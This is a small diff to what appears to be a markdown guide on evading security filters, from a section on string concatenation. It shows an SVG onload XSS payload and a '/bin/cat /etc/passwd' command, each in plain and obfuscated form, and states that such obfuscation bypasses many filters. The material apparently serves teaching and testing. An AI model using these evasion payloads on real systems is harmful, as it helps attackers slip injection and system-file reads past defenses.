@@ -1688,7 +1688,7 @@ __9. String Concatenation__
 - This allows us to effectively generate payloads that can bypass many filters and rules.
 
 __Standard__: `<svg/onload-location=javascript:alert%281%29;//`  
-__Obfuscated__: `<svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//`
+__Obfuscated__: ```<svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//```
 
 __Standard__: `/bin/cat /etc/passwd`  
 __Obfuscated__: `/bi'n'''/c''at' /e'tc'/pa'''ss'wd`
